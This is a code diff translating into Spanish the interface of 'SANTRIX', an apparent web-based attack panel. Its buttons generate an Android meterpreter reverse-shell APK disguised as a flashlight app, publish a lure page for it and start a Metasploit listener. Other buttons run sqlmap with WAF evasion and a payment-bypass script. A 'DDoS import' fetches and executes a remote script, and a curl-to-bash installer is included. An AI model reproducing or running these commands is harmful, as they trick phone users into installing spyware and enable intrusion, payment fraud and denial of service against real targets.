@@ -388,10 +388,10 @@
 <div class="topbar">
   <span class="topbar-logo">⚡ SANTRIX</span>
   <div class="topbar-actions">
-    <button class="topbar-btn" onclick="runCommand('clear')">CLR</button>
-    <button class="topbar-btn" onclick="copyTerminal()">COPY</button>
-    <button class="topbar-btn" onclick="pasteTerminal()">PASTE</button>
-    <button class="topbar-btn danger" onclick="sendCtrlC()">✕ STOP</button>
+    <button class="topbar-btn" onclick="runCommand('clear')">LIMPIAR</button>
+    <button class="topbar-btn" onclick="copyTerminal()">COPIAR</button>
+    <button class="topbar-btn" onclick="pasteTerminal()">PEGAR</button>
+    <button class="topbar-btn danger" onclick="sendCtrlC()">✕ DETENER</button>
   </div>
 </div>
 
@@ -403,16 +403,16 @@
     <!-- Category Tabs -->
     <div class="cat-tabs">
       <div class="cat-tab active" data-cat="enum"   onclick="switchCat('enum')">
-        <span class="tab-icon">🔍</span>ENUM
+        <span class="tab-icon">🔍</span>ENUMERAR
       </div>
       <div class="cat-tab" data-cat="sqli"   onclick="switchCat('sqli')">
-        <span class="tab-icon">💉</span>SQLi
+        <span class="tab-icon">💉</span>INYECCIÓN
       </div>
       <div class="cat-tab" data-cat="net"    onclick="switchCat('net')">
         <span class="tab-icon">🌐</span>RED
       </div>
       <div class="cat-tab" data-cat="exploit" onclick="switchCat('exploit')">
-        <span class="tab-icon">💥</span>EXPLOIT
+        <span class="tab-icon">💥</span>EXPLOTAR
       </div>
       <div class="cat-tab" data-cat="fintech" onclick="switchCat('fintech')">
         <span class="tab-icon">💳</span>FINTECH
@@ -433,11 +433,11 @@
         <div class="tcard" data-color="cyan" onclick="openModal('webenum')">
           <div class="tcard-badge">PRO</div>
           <div class="tcard-icon">🕷️</div>
-          <div class="tcard-name">Web Enumerator</div>
+          <div class="tcard-name">Enumerador Web</div>
         </div>
         <div class="tcard" data-color="cyan" onclick="openModal('gobuster')">
           <div class="tcard-icon">📂</div>
-          <div class="tcard-name">Gobuster DIR</div>
+          <div class="tcard-name">Fuerza Bruta DIR</div>
         </div>
         <div class="tcard" data-color="cyan" onclick="openModal('ffuf')">
           <div class="tcard-icon">⚡</div>
@@ -455,18 +455,18 @@
           <div class="tcard-badge">sqlmap</div>
           <div class="tcard-icon">💉</div>
           <div>
-            <div class="tcard-name">SQLi Scanner</div>
-            <div style="font-size:0.65rem;color:var(--muted);margin-top:3px;">Detección de inyecciones SQL</div>
+            <div class="tcard-name">Escáner SQLi</div>
+            <div style="font-size:0.65rem;color:var(--muted);margin-top:3px;">Detección automática de inyecciones SQL</div>
           </div>
         </div>
         <div class="tcard" data-color="pink" onclick="openModal('sqli-hard')">
           <div class="tcard-badge">WAF</div>
           <div class="tcard-icon">🛡️</div>
-          <div class="tcard-name">Hard Mode (WAF)</div>
+          <div class="tcard-name">Modo Difícil (WAF)</div>
         </div>
         <div class="tcard" data-color="pink" onclick="openModal('sqli-post')">
           <div class="tcard-icon">📨</div>
-          <div class="tcard-name">SQLi POST</div>
+          <div class="tcard-name">SQLi por POST</div>
         </div>
       </div>
 
@@ -474,7 +474,7 @@
       <div class="cat-page" id="cat-net">
         <div class="tcard" data-color="green" onclick="openModal('nmap')">
           <div class="tcard-icon">📡</div>
-          <div class="tcard-name">Nmap Scanner</div>
+          <div class="tcard-name">Nmap Rápido</div>
         </div>
         <div class="tcard" data-color="green" onclick="openModal('nmap-full')">
           <div class="tcard-badge">-A</div>
@@ -483,19 +483,19 @@
         </div>
         <div class="tcard" data-color="green" onclick="openModal('headers')">
           <div class="tcard-icon">📋</div>
-          <div class="tcard-name">HTTP Headers</div>
+          <div class="tcard-name">Cabeceras HTTP</div>
         </div>
         <div class="tcard" data-color="green" onclick="openModal('whois')">
           <div class="tcard-icon">🌍</div>
-          <div class="tcard-name">Whois Lookup</div>
+          <div class="tcard-name">Búsqueda Whois</div>
         </div>
         <div class="tcard" data-color="green" onclick="openModal('audit')">
           <div class="tcard-icon">📊</div>
-          <div class="tcard-name">Audit & Stress</div>
+          <div class="tcard-name">Auditoría Web</div>
         </div>
         <div class="tcard" data-color="green" onclick="openModal('ping')">
           <div class="tcard-icon">🏓</div>
-          <div class="tcard-name">Ping / Trace</div>
+          <div class="tcard-name">Ping / Traza</div>
         </div>
       </div>
 
@@ -505,8 +505,8 @@
           <div class="tcard-badge">LIVE</div>
           <div class="tcard-icon">🐉</div>
           <div>
-            <div class="tcard-name">Metasploit Console</div>
-            <div style="font-size:0.65rem;color:var(--muted);margin-top:3px;">Framework de explotación</div>
+            <div class="tcard-name">Consola Metasploit</div>
+            <div style="font-size:0.65rem;color:var(--muted);margin-top:3px;">Marco de explotación profesional</div>
           </div>
         </div>
         <div class="tcard" data-color="purple" onclick="openModal('msfvenom')">
@@ -516,20 +516,20 @@
         <div class="tcard" data-color="purple" onclick="runCommand('msfvenom -p android/meterpreter/reverse_tcp LHOST=$(curl -s ifconfig.me) LPORT=4444 -o public/downloads/flashlight.apk && chmod +r public/downloads/flashlight.apk')">
           <div class="tcard-badge">APK</div>
           <div class="tcard-icon">🔦</div>
-          <div class="tcard-name">Gen APK</div>
+          <div class="tcard-name">Generar APK</div>
         </div>
         <div class="tcard" data-color="purple" onclick="runCommand('msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit\"')">
           <div class="tcard-icon">📶</div>
-          <div class="tcard-name">Listener</div>
+          <div class="tcard-name">Escuchar Conexión</div>
         </div>
         <div class="tcard" data-color="purple" onclick="createFlashlightPage()">
           <div class="tcard-icon">🌐</div>
-          <div class="tcard-name">Deploy Page</div>
+          <div class="tcard-name">Publicar Página</div>
         </div>
         <div class="tcard" data-color="orange" onclick="openModal('ddos')">
           <div class="tcard-badge">EDU</div>
           <div class="tcard-icon">🌊</div>
-          <div class="tcard-name">DDoS Import</div>
+          <div class="tcard-name">Importar DDoS</div>
         </div>
       </div>
 
@@ -539,17 +539,17 @@
           <div class="tcard-badge">REAL</div>
           <div class="tcard-icon">💳</div>
           <div>
-            <div class="tcard-name">Payment Bypass Auditor</div>
+            <div class="tcard-name">Auditor de Pagos</div>
             <div style="font-size:0.65rem;color:var(--muted);margin-top:3px;">Prueba manipulación de parámetros y webhooks</div>
           </div>
         </div>
         <div class="tcard" data-color="yellow" onclick="runCommand('./scripts/security_audit.sh mobile-api')">
           <div class="tcard-icon">📱</div>
-          <div class="tcard-name">Mobile API Audit</div>
+          <div class="tcard-name">Auditoría API Móvil</div>
         </div>
         <div class="tcard" data-color="yellow" onclick="runCommand('nmap -p 8080 $(hostname -I)')">
           <div class="tcard-icon">🔌</div>
-          <div class="tcard-name">API Proxy Scan</div>
+          <div class="tcard-name">Escanear Proxy API</div>
         </div>
       </div>
 
@@ -557,11 +557,11 @@
       <div class="cat-page" id="cat-sys">
         <div class="tcard" data-color="orange" onclick="runCommand('top')">
           <div class="tcard-icon">📈</div>
-          <div class="tcard-name">Process Monitor</div>
+          <div class="tcard-name">Monitor de Procesos</div>
         </div>
         <div class="tcard" data-color="orange" onclick="runCommand('ls -la')">
           <div class="tcard-icon">📁</div>
-          <div class="tcard-name">File Explorer</div>
+          <div class="tcard-name">Explorador de Archivos</div>
         </div>
         <div class="tcard" data-color="orange" onclick="runCommand('df -h && free -h')">
           <div class="tcard-icon">💾</div>
@@ -569,7 +569,7 @@
         </div>
         <div class="tcard" data-color="orange" onclick="runCommand('whoami && id && uname -a')">
           <div class="tcard-icon">🖥️</div>
-          <div class="tcard-name">Sys Info</div>
+          <div class="tcard-name">Info del Sistema</div>
         </div>
         <div class="tcard" data-color="orange" onclick="runCommand('cat /etc/passwd | head -20')">
           <div class="tcard-icon">👤</div>
@@ -593,15 +593,15 @@
         </div>
         <div class="tcard" data-color="green" onclick="runCommand('./scripts/termux_setup.sh')">
           <div class="tcard-icon">📖</div>
-          <div class="tcard-name">Setup Manual</div>
+          <div class="tcard-name">Configuración Manual</div>
         </div>
         <div class="tcard" data-color="green" onclick="runCommand('pkg update -y && pkg upgrade -y')">
           <div class="tcard-icon">🔄</div>
-          <div class="tcard-name">Update Termux</div>
+          <div class="tcard-name">Actualizar Termux</div>
         </div>
         <div class="tcard" data-color="green" onclick="runCommand('pkg install -y nmap python git curl wget')">
           <div class="tcard-icon">🛠️</div>
-          <div class="tcard-name">Deps Base</div>
+          <div class="tcard-name">Dependencias Base</div>
         </div>
       </div>
 
@@ -615,7 +615,7 @@
       <button class="qbtn" onclick="runCommand('pwd')">PWD</button>
       <button class="qbtn" onclick="runCommand('cd ..')">CD ..</button>
       <button class="qbtn" onclick="runCommand('clear')">CLR</button>
-      <button class="qbtn red" onclick="sendCtrlC()">✕ C</button>
+      <button class="qbtn red" onclick="sendCtrlC()">✕ PARAR</button>
     </div>
   </div>
 
@@ -625,7 +625,7 @@
       <div class="term-dot" style="background:#ff5f57"></div>
       <div class="term-dot" style="background:#febc2e"></div>
       <div class="term-dot" style="background:#28c840"></div>
-      <span class="term-title">SANTRIX TERMINAL — bash</span>
+      <span class="term-title">TERMINAL SANTRIX — bash</span>
     </div>
     <div id="terminal" style="flex:1;height:calc(100% - 34px);"></div>
   </div>
@@ -707,15 +707,15 @@
 
   const modalDefs = {
     'webenum': {
-      icon: '🕷️', title: 'Web Enumerator Pro', desc: 'Directorios, DNS, fuzzing completo',
+      icon: '🕷️', title: 'Enumerador Web Pro', desc: 'Directorios, DNS y fuzzing completo',
       fields: [
         { id: 'url', label: 'URL Objetivo', placeholder: 'http://10.10.10.10' }
       ],
-      modes: ['dir','dns','fuzz','all'],
-      run: (vals, mode) => `./scripts/web_enum.sh "${vals.url}" ${mode || 'all'}`
+      modes: ['dir','dns','fuzz','todo'],
+      run: (vals, mode) => `./scripts/web_enum.sh "${vals.url}" ${mode === 'todo' ? 'all' : (mode || 'all')}`
     },
     'gobuster': {
-      icon: '📂', title: 'Gobuster Directorios', desc: 'Brute force de rutas y archivos',
+      icon: '📂', title: 'Fuerza Bruta de Directorios', desc: 'Descubre rutas y archivos ocultos',
       fields: [{ id: 'url', label: 'URL Objetivo', placeholder: 'http://10.10.10.10' }],
       run: (v) => `gobuster dir -u "${v.url}" -w /tmp/santrix_wordlists/common.txt -t 20 --timeout 10s`
     },
@@ -725,89 +725,89 @@
       run: (v) => `ffuf -u "${v.url}" -w /tmp/santrix_wordlists/common.txt -mc 200,201,301,302,403 -ac -v`
     },
     'gobuster-dns': {
-      icon: '🔎', title: 'Enumeración DNS', desc: 'Descubre subdominios',
-      fields: [{ id: 'domain', label: 'Dominio', placeholder: 'example.com' }],
+      icon: '🔎', title: 'Enumeración de Subdominios', desc: 'Descubre subdominios ocultos',
+      fields: [{ id: 'domain', label: 'Dominio', placeholder: 'ejemplo.com' }],
       run: (v) => `gobuster dns -d "${v.domain}" -w /tmp/santrix_wordlists/common.txt -t 20`
     },
     'sqli': {
-      icon: '💉', title: 'SQLi Scanner', desc: 'Detección automática con sqlmap',
+      icon: '💉', title: 'Escáner de Inyección SQL', desc: 'Detección automática con sqlmap',
       fields: [
         { id: 'url', label: 'URL Objetivo', placeholder: 'http://objetivo.com/login?id=1' }
       ],
       run: (v) => `./scripts/sql_scanner.sh "${v.url}"`
     },
     'sqli-hard': {
-      icon: '🛡️', title: 'SQLi Hard Mode', desc: 'Evasión de WAF / Cloudflare',
+      icon: '🛡️', title: 'SQLi Modo Difícil', desc: 'Evasión de cortafuegos WAF / Cloudflare',
       fields: [
         { id: 'url', label: 'URL Objetivo', placeholder: 'http://objetivo.com/?id=1' }
       ],
       run: (v) => `./scripts/sql_scanner.sh "${v.url}" --evade`
     },
     'sqli-post': {
-      icon: '📨', title: 'SQLi POST', desc: 'Inyección vía parámetros POST',
+      icon: '📨', title: 'SQLi por Formulario POST', desc: 'Inyección vía parámetros POST',
       fields: [
-        { id: 'url',  label: 'URL', placeholder: 'http://objetivo.com/login' },
-        { id: 'data', label: 'Datos POST', placeholder: 'user=admin&pass=1' }
+        { id: 'url',  label: 'URL del formulario', placeholder: 'http://objetivo.com/login' },
+        { id: 'data', label: 'Datos del formulario', placeholder: 'usuario=admin&clave=1' }
       ],
       run: (v) => `./scripts/sql_scanner.sh "${v.url}" --data="${v.data}"`
     },
     'nmap': {
-      icon: '📡', title: 'Nmap Rápido', desc: 'Escaneo rápido de puertos',
-      fields: [{ id: 'target', label: 'IP / Dominio', placeholder: '10.10.10.10' }],
+      icon: '📡', title: 'Nmap Rápido', desc: 'Escaneo rápido de puertos abiertos',
+      fields: [{ id: 'target', label: 'IP o Dominio', placeholder: '10.10.10.10' }],
       run: (v) => `nmap -T4 -F --open ${v.target}`
     },
     'nmap-full': {
-      icon: '🔬', title: 'Nmap Completo', desc: 'Detección de servicios y OS',
-      fields: [{ id: 'target', label: 'IP / Dominio', placeholder: '10.10.10.10' }],
+      icon: '🔬', title: 'Nmap Completo', desc: 'Detecta servicios, versiones y sistema operativo',
+      fields: [{ id: 'target', label: 'IP o Dominio', placeholder: '10.10.10.10' }],
       run: (v) => `nmap -T4 -A -p- --open ${v.target}`
     },
     'headers': {
-      icon: '📋', title: 'HTTP Headers', desc: 'Analiza cabeceras de seguridad',
+      icon: '📋', title: 'Analizador de Cabeceras HTTP', desc: 'Detecta cabeceras de seguridad incorrectas',
       fields: [{ id: 'url', label: 'URL', placeholder: 'https://ejemplo.com' }],
       run: (v) => `curl -s -I --max-time 10 "${v.url}"`
     },
     'whois': {
-      icon: '🌍', title: 'Whois Lookup', desc: 'Información de registro de dominio',
-      fields: [{ id: 'domain', label: 'Dominio / IP', placeholder: 'ejemplo.com' }],
+      icon: '🌍', title: 'Búsqueda Whois', desc: 'Información del registro del dominio',
+      fields: [{ id: 'domain', label: 'Dominio o IP', placeholder: 'ejemplo.com' }],
       run: (v) => `whois ${v.domain}`
     },
     'audit': {
-      icon: '📊', title: 'Audit & Stress', desc: 'Análisis de seguridad web completo',
+      icon: '📊', title: 'Auditoría y Estrés Web', desc: 'Análisis completo de seguridad web',
       fields: [{ id: 'url', label: 'URL', placeholder: 'https://tu-web.com' }],
       run: (v) => `./scripts/security_audit.sh "${v.url}"`
     },
     'ping': {
-      icon: '🏓', title: 'Ping / Traceroute', desc: 'Conectividad y ruta de red',
-      fields: [{ id: 'host', label: 'Host / IP', placeholder: '10.10.10.10' }],
+      icon: '🏓', title: 'Ping y Traza de Ruta', desc: 'Verifica conectividad y ruta de red',
+      fields: [{ id: 'host', label: 'Host o IP', placeholder: '10.10.10.10' }],
       run: (v) => `ping -c 4 ${v.host} && traceroute ${v.host} 2>/dev/null`
     },
     'payment': {
-      icon: '💳', title: 'Payment Bypass', desc: 'Prueba pasarelas de pago autorizadas',
-      fields: [{ id: 'url', label: 'URL del Gateway', placeholder: 'https://tu-tienda.com/pay' }],
+      icon: '💳', title: 'Auditor de Pasarela de Pago', desc: 'Prueba vulnerabilidades en pagos autorizados',
+      fields: [{ id: 'url', label: 'URL de la pasarela', placeholder: 'https://tu-tienda.com/pago' }],
       run: (v) => `./scripts/payment_bypass.sh "${v.url}"`
     },
     'msfvenom': {
-      icon: '🧬', title: 'MSFVenom Payload', desc: 'Generador de payloads',
+      icon: '🧬', title: 'Generador de Carga MSFVenom', desc: 'Crea cargas para pruebas de penetración',
       fields: [
-        { id: 'lhost', label: 'LHOST (tu IP)', placeholder: '10.0.0.1' },
-        { id: 'lport', label: 'LPORT', placeholder: '4444' }
+        { id: 'lhost', label: 'Tu dirección IP (LHOST)', placeholder: '10.0.0.1' },
+        { id: 'lport', label: 'Puerto de escucha (LPORT)', placeholder: '4444' }
       ],
       run: (v) => `msfvenom -p android/meterpreter/reverse_tcp LHOST=${v.lhost} LPORT=${v.lport} -o public/downloads/payload.apk`
     },
     'ddos': {
-      icon: '🌊', title: 'DDoS Script Import', desc: 'Importar y ejecutar script externo',
+      icon: '🌊', title: 'Importar Script DDoS', desc: 'Descarga y ejecuta un script externo',
       fields: [{ id: 'url', label: 'URL del script .sh', placeholder: 'https://raw.github.../script.sh' }],
       run: (v) => `curl -L -o /tmp/ddos_tool.sh "${v.url}" && chmod +x /tmp/ddos_tool.sh && /tmp/ddos_tool.sh`
     },
     'termux-install': {
-      icon: '📦', title: 'Instalar en Termux', desc: 'Copia y pega en tu Termux',
+      icon: '📦', title: 'Instalar en Termux', desc: 'Copia y pega este comando en tu Termux',
       fields: [],
       custom: () => {
         const url = window.location.origin;
         return `<div class="modal-field">
-          <div class="modal-label">Comando para pegar en Termux:</div>
+          <div class="modal-label">Copia este comando y pégalo en tu Termux:</div>
           <textarea class="modal-input" rows="3" readonly style="font-size:0.72rem;resize:none;" onclick="this.select()">curl -sL ${url}/scripts/termux_setup.sh -o setup.sh && chmod +x setup.sh && bash setup.sh ${url}</textarea>
-          <div style="font-size:0.68rem;color:var(--muted);margin-top:6px;">Toca el comando para seleccionarlo y copiarlo.</div>
+          <div style="font-size:0.68rem;color:var(--muted);margin-top:6px;">Toca el recuadro para seleccionar todo el comando.</div>
         </div>`;
       },
       noRun: true
@@ -837,7 +837,7 @@
         html += `<div class="modal-field">
           <div class="modal-label">Modo de escaneo</div>
           <div class="modal-modes">
-            ${def.modes.map(m => `<button class="mode-btn ${m==='all'?'selected':''}" onclick="selectMode('${m}',this)">${m.toUpperCase()}</button>`).join('')}
+            ${def.modes.map(m => `<button class="mode-btn ${m==='todo'?'selected':''}" onclick="selectMode('${m}',this)">${m.toUpperCase()}</button>`).join('')}
           </div>
         </div>`;
       }
